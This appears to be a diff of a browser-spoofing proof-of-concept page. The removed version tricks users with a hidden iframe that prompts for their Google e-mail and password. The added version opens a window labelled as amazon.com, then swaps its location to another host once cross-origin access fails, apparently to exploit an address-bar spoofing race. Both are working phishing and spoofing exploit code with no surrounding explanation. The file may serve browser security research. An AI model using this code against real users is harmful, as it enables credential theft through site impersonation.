@@ -1,25 +1,15 @@
-<html>
-  <body>
 
-    <script>
+<script>
+  function next() {
+         w.location.replace('https://www.google.com:1234');
+        }
 
-    function exploit() {
+  function f() {
+    w = window.open("");
+    w.document.write('<h2>This is not amazon.com!</h2>');
+    w.location = "https://amazon.com";
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
+</script>
 
-      window.open("https://www.google.com");
-
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-    
-    }
-    
-    </script>
-
-    <br><br><br><br>
-
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
-</html>
+<a href="#" onclick="f()">Login Amazon</a>
